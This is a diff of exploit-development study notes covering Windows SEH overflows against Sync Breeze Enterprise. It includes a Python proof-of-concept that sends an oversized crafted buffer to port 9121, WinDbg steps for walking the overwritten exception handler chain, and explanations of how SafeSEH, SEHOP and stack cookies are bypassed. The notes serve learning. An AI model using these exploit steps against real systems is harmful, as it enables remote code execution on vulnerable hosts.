@@ -681,7 +681,7 @@ ld hello.o -o hello
 ./hello
 ```
 
-## Gdb commands
+## GDB commands
 
 ```bash
 gdb test
@@ -844,8 +844,7 @@ The EIP register has been overwritten with `42306142` (hexadecimal value of "B0a
 ```bash
 msf-pattern_offset -l 800 -q 42306142
 ```
-
-*[*] Exact match at offset 780*
+[*] Exact match at offset 780
 
 ```python
 #!/usr/bin/python
@@ -911,8 +910,7 @@ dds esp+2c0 L4
 ```
 ? 00567724 - 0056745c
 ```
-
-*Evaluate expression: 712 = 000002c48*
+Evaluate expression: 712 = 000002c48
 
 => 712 bytes of free space for our shellcode.
 
@@ -1010,8 +1008,7 @@ At offset `0x3C`, the `e_lfanew` field contains the offset to our PE header (`0x
 ```
 ? 0n232
 ```
-
-*Evaluate expression: 232 = 000000e8*
+Evaluate expression: 232 = 000000e8
 
 ```
 dt ntdll!_IMAGE_NT_HEADERS 0x00400000+0xe8
@@ -1051,8 +1048,7 @@ nasm > jmp esp
 ```nasm
 lm m libspp
 ```
-
-*10000000 10223000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll*
+10000000 10223000   libspp   C (export symbols)       C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
 
 ```nasm
 s -b 10000000 10223000 0xff 0xe4
@@ -1256,75 +1252,325 @@ except:
   print("Could not connect!")
 ```
 
-# SEH
+# Exploiting SEH Overflows
 
-```nasm
+`python3 seh_overflow_0x01.py 192.168.120.10`
 
+```python
+#!/usr/bin/python
+import socket
+import sys
+from struct import pack
+
+try:
+  server = sys.argv[1]
+  port = 9121
+  size = 1000
+
+  inputBuffer = b"\x41" * size
+
+  header =  b"\x75\x19\xba\xab"
+  header += b"\x03\x00\x00\x00"
+  header += b"\x00\x40\x00\x00"
+  header += pack('<I', len(inputBuffer))
+  header += pack('<I', len(inputBuffer))
+  header += pack('<I', inputBuffer[-1])
+
+  buf = header + inputBuffer 
+
+  print("Sending evil buffer...")
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.connect((server, port))
+  s.send(buf)
+  s.close()
+  
+  print("Done!")
+  
+except socket.error:
+  print("Could not connect!")
 ```
 
+The EAX register was overwritten by our "A" buffer.
 
-```nasm
-
-```
-
-
-```nasm
+Attempting to execute the "call dword ptr [eax+24h]" instruction triggers an access violation.
 
 ```
-
-```nasm
-
+r
+dds esp L30
 ```
 
+At this point, the debugger intercepted a 1st chance exception, which is a notification that an unexpected event occurred during the program's normal execution.
 
-```nasm
-
-```
-
-
-```nasm
+If we let the application go (g), we have now "magically" gained control over the instruction pointer (eip=41414141)
 
 ```
-
-
-```nasm
-
+g
 ```
 
+## Structured Exception Handling
+
+**Exceptions** are unexpected events that occur during normal program execution.
+
+2 kinds of exceptions:
+
+- **Hardware** exceptions are initiated by the CPU. E.g. when our script crashed the Sync Breeze service as the CPU attempted to dereference an invalid memory address.
+
+- **Software** exceptions are explicitly initiated by applications when the execution flow reaches unexpected or unwanted conditions. E.g., a software developer might want to raise an exception in their code to signal that a function could not execute normally because of an invalid input argument.
+
+Define an exception construct through a `_try/_except` code block.
+
+When compiled, the `_try/_except` code will leverage the Structure Exception Handling (SEH) mechanism implemented by the Windows OS to handle unexpected events.
+
+When a thread faults, the OS calls a designated set of functions (aka **exception handlers**), which can correct, or provide more information about, the unexpected condition.
+
+The exception handlers are **user-defined** and are created during the compilation of the `_except` code blocks.
+
+The **default exception handler** is a special case in that it is **defined by the OS** itself.
+
+The OS must be able to locate the correct exception handler when an unexpected event is encountered.
+
+Structured exception handling works on a **per-thread level**.
+
+Each thread in a program can be identified by the **Thread Environmental Block (TEB)** structure.
+
+Every time a try block is encountered during the execution of a function in a thread, a pointer to the corresponding exception handler is saved on the stack within the `_EXCEPTION_REGISTRATION_RECORD` structure.
+
+Since there may be several try blocks executed in a function, these structures are connected together in a **linked list**.
+
+![SEH Mechanism in action](Images\SEH_mechanism.png)
+ 
+When an exception occurs, the OS inspects the TEB structure of the faulting thread and retrieves a pointer (`ExceptionList`) to the linked list of `_EXCEPTION_REGISTRATION_RECORD` structures through the FS CPU register.
+
+The CPU can access the TEB structure at any given time using the FS segment register at offset zero (`fs:[0]`) on the x86 architecture.
+
+After retrieving the `ExceptionList`, the OS will begin to walk it and invoke every exception handler function until one is able to deal with the unexpected event.
+
+If none of the user-defined functions can handle the exception, the OS invokes the **default exception handler**, which is always the **last node in the linked list**.
+
+This is a special exception handler that terminates the current process or thread in case the application is a **system service**.
+
+### Key Exception Handling Structures
+
+Dump the TEB structure:
 
 ```nasm
-
+dt nt!_TEB
 ```
 
+The `nt!_TEB` structure starts with a nested structure called `_NT_TIB`.
 
+Dumping `_NT_TIB` shows the 1st member in this structure is a pointer named `ExceptionList`, which points to the first `_EXCEPTION_REGISTRATION_RECORD` structure.
+
+```
+dt _NT_TIB
+```
+
+The `_EXCEPTION_REGISTRATION_RECORD` structure contains 2 members:
+
+- `Next`, which points to a `_EXCEPTION_REGISTRATION_RECORD` structure
+
+- `Handler`, which points to an `_EXCEPTION_DISPOSITION` structure.
+
+```
+dt _EXCEPTION_REGISTRATION_RECORD
+```
+
+The `Next` member acts as a link between `_EXCEPTION_REGISTRATION_RECORD` structures in the singly-linked list of registered exception handlers.
+
+The `Handler` member is a pointer to the exception callback function named `_except_handler`, which returns an `_EXCEPTION_DISPOSITION` structure on Windows 10 x86.
+
+The `_except_handler` function prototype:
+
+```C
+typedef EXCEPTION_DISPOSITION _except_handler (*PEXCEPTION_ROUTINE) (  
+    IN PEXCEPTION_RECORD ExceptionRecord,  
+    IN VOID EstablisherFrame,  
+    IN OUT PCONTEXT ContextRecord,  
+    IN OUT PDISPATCHER_CONTEXT DispatcherContext  
+); 
+```
+
+Inside a debugger, the function can have different name variations, such as `ntdll!_except_handler4`. These naming differences are introduced by the symbols provided by Microsoft for each version of Windows.
+
+- `EstablisherFrame` points to the `_EXCEPTION_REGISTRATION_RECORD` structure, which is used to handle the exception.
+
+- `ContextRecord` is a pointer to a `CONTEXT` structure, which contains processor-specific register data at the time the exception was raised.
+
+Dump the `CONTEXT` structure
+
+```
+dt ntdll!_CONTEXT
+```
+
+This structure stores the state of all our registers, including the instruction pointer (EIP). => used to **restore the execution flow after handling the exception**.
+
+`_EXCEPTION_DISPOSITION` structure contains the result of the exception handling process.
 
 ```nasm
-
+dt _EXCEPTION_DISPOSITION
 ```
 
+- If the exception handler invoked by the OS is not valid for dealing with a specific exception, it will return `ExceptionContinueSearch`. This result instructs the OS to move on to the next `_EXCEPTION_REGISTRATION_RECORD` structure in the linked list.
 
-```nasm
+- If the function handler can successfully handle the exception, it will return `ExceptionContinueExecution`, which instructs the system to resume execution.
 
+How the OS calls the exception handler functions and what checks are performed before invoking them.
+
+### SEH Validation
+
+When an exception is encountered, `ntdll!KiUserExceptionDispatcher` is called. This function is responsible for dispatching exceptions on Windows OS.
+
+The function takes 2 arguments.
+
+1. An `_EXCEPTION_RECORD` structure that contains information about the exception.
+
+2. A `CONTEXT` structure.
+
+Eventually, this function calls into `RtlDispatchException`, which will retrieve the **TEB** and proceed to parse the `ExceptionList` through the mechanism explained.
+
+During this process, for each `Handler` member in the singly-linked `ExceptionList` list, the OS will ensure that the `_EXCEPTION_REGISTRATION_RECORD` structure falls within the **stack memory limits** found in the TEB.
+
+During the execution of `RtlDispatchException`, the OS performs additional checks by invoking the `RtlIsValidHandler` function for every exception handler.
+
+`RtlIsValidHandler` is responsible for the **SafeSEH** implementation - a mitigation to prevent an attacker from gaining control of the execution flow after overwriting a stack-based exception handler.
+
+If a module is compiled with the **SafeSEH** flag, the linker will produce an image containing a table of safe exception handlers.
+
+A **linker** is a computer program that combines object files generated by a compiler or assembler into a single executable or library file. It can even combine object files into another object file.
+
+The OS will then validate the exception_handler on the stack by comparing it to the entries in the table of safe exception handlers. If the handler is not found, the system will refuse to execute it.
+
+Pseudo-code for the `RtlIsValidHandler` function
+
+```C
+BOOL RtlIsValidHandler(Handler) // NT 6.3.9600
+  {
+        if (/* Handler within the image */) {
+            if (DllCharacteristics->IMAGE_DLLCHARACTERISTICS_NO_SEH)
+                goto InvalidHandler;
+            if (/* The image is .Net assembly, 'ILonly' flag is enabled */)
+                goto InvalidHandler;
+            if (/* Found 'SafeSEH' table */) {
+                if (/* The image is registered in 'LdrpInvertedFunctionTable' (or its cache), or the initialization of the process is not complete */) {
+                    if (/* Handler found in 'SafeSEH' table */)
+                        return TRUE;
+                    else
+                        goto InvalidHandler;
+                }
+            return TRUE;
+        } else {
+            if (/* 'ExecuteDispatchEnable' and 'ImageDispatchEnable' flags are enabled in 'ExecuteOptions' of the process */)
+                return TRUE;
+            if (/* Handler is in non-executable area of the memory */) {
+                if (ExecuteDispatchEnable) return TRUE;
+            }
+            else if (ImageDispatchEnable) return TRUE;
+        }
+        InvalidHandler:
+            RtlInvalidHandlerDetected(...);
+            return FALSE;
+  }
 ```
 
+The `RtlIsValidHandler` function checks the `DllCharacteristics` of the specific **module** where the exception occurs.
 
-```nasm
+If the module is compiled with **SafeSEH**, the `exception_handler` will be compared to the entries in the table of safe exception handlers before it is executed.
+
+If `RtlIsValidHandler` succeeds with its validation steps, the OS will call the `RtlpExecuteHandlerForException` function. This function is responsible for setting up the appropriate arguments and invoking `ExecuteHandler`. This native API is responsible for calling the `_except_handler` functions registered on the stack.
+
+SafeSEH requires applications to be compiled with the `/SAFESEH` flag Microsoft introduced an additional mitigation named **Structured Exception Handler Overwrite Protection (SEHOP)**.
+
+**SEHOP** works by verifying that the chain of `_EXCEPTION_REGISTRATION_RECORD` structures are valid before invoking them.
+
+Because the `Next` member is overwritten as part of a SEH overflow the chain of `_EXCEPTION_REGISTRATION_RECORD` structures is no longer intact and the SEHOP mitigation will prevent the corrupted `_except_handler` from executing.
+
+SEHOP is disabled by default on Windows client editions and enabled by default on server editions.
+
+Whenever an exception occurs, the OS calls a designated set of functions as part of the SEH mechanism. Within these function calls, the `ExceptionList` single-linked list is gathered from the TEB structure.
+
+Next, the OS parses the singly-linked list of `_EXCEPTION_REGISTRATION_RECORD` structures, performing various checks before calling the `exception_handler` function pointed to by each `Handler` member. This continues until a handler is found that will successfully process the exception and allow execution to continue. If no handler can successfully handle the exception, the application will crash.
+
+## Structured Exception Handler Overflows
+
+A structure exception overflow is a stack buffer overflow that is either large enough or positioned in such a way to overwrite valid registered exception handlers on the stack.
+
+By overwriting one or more of these handlers, the attacker can take control of the instruction pointer after triggering an exception.
+
+In most cases, an overflow tends to overwrite valid pointers and structures on the stack, which often generates an access violation exception.
+
+If this does not occur, an attacker can often force an exception by increasing the size of the overflow.
+
+### SEH Overflows can Bypass Stack Cookies
+
+Stack overflow mitigation named `GS` is enabled by default in modern versions of Visual Studio.
+
+When a binary that is compiled with the `/GS` flag is loaded a **random stack cookie seed** value is initialized and stored in the `.data` section of the binary.
+
+When a **function** protected by GS is called, an **XOR operation** takes place between the stack cookie seed value and the EBP register. The result of this operation is stored on the stack prior to the return address.
+
+Before returning out of the protected function, another XOR operation occurs between the previous value saved on the stack and the EBP register. This result is then checked with the stack cookie seed value from the `.data` section. If the values do not match the application will throw an exception and terminate the execution.
+
+Overwriting an exception handler and causing the application to crash in any way triggers the SEH mechanism and causes the instruction pointer to be redirected to the address of the `exception_handler` prior to reaching the end of the vulnerable function.
+
+=> Overwriting a `_EXCEPTION_REGISTRATION_RECORD` can allow an attacker to **bypass stack cookies**.
+
+The `_EXCEPTION_REGISTRATION_RECORD` structures are stored at the beginning of the stack space.
+
+### Inspect a chain of `_EXCEPTION_REGISTRATION_RECORD` structures
+
+Because the SEH mechanism works on a per-thread basis, we won't be able to inspect the intact SEH chain for the thread handling our incoming data, as that thread has not yet spawned.
+
+Instead, we will inspect the chain of `_EXCEPTION_REGISTRATION_RECORD` structures for the thread WinDbg breaks into when we attach the debugger to the target process.
+
+Obtain the TEB address which will contain the `ExceptionList` pointer:
 
 ```
-
-
-```nasm
-
+!teb
 ```
 
+The `ExceptionList` starts very close to the beginning of the `StackBase`.
 
-```nasm
+Dump the first `_EXCEPTION_REGISTRATION_RECORD` structure at the memory address specified in the `ExceptionList` member.
+
+The `_EXCEPTION_REGISTRATION_RECORD` structure has 2 members:
+
+- `Next` points to the next entry in the singly-linked list.
+- `Handler` is the memory address of the `_except_handler` function.
 
 ```
+dt _EXCEPTION_REGISTRATION_RECORD 0132ff70
+dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffcc
+dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffe4
+```
 
-```nasm
+The end of the singly-linked list is marked by the `0xffffffff` value stored by the last `_EXCEPTION_REGISTRATION_RECORD` `Next` member. This last record is the default exception handler specified by the OS.
+
+### Back to the PoC
+
+Send our previous PoC, once again triggering an access violation:
+
+```bash
+python3 seh_overflow_0x01.py 192.168.120.10
+```
+
+Attempt to walk the `ExceptionList` => The **second** `_EXCEPTION_REGISTRATION_RECORD` structure has been overwritten by our malicious buffer.
 
 ```
+!teb
+dt _EXCEPTION_REGISTRATION_RECORD 01c4fe1c
+dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54
+```
+
+### Important Note
+
+`_EXCEPTION_REGISTRATION_RECORD` structures are pushed on the stack from first to last.
+
+=> SEH overflows generally overwrite the last `_EXCEPTION_REGISTRATION_RECORD` structure first. Depending on the length of the overflow, it is possible to overwrite more than one `_EXCEPTION_REGISTRATION_RECORD` structure.
+
+The exception occurs because the application is trying to read and execute from an unmapped memory page. This causes an access violation exception that needs to be handled by either the application or the OS.
+
+WinDbg allows us to automatically list the current thread exception handler chain with !exchain.4 The !exchain extension displays the exception handlers of the current thread. It supports three arguments that can be used to gather information on specific types of exceptions, such as C++ try/catch exceptions. By default, it displays the exception handler implemented using the SEH mechanism.
+
 
 
 ```nasm
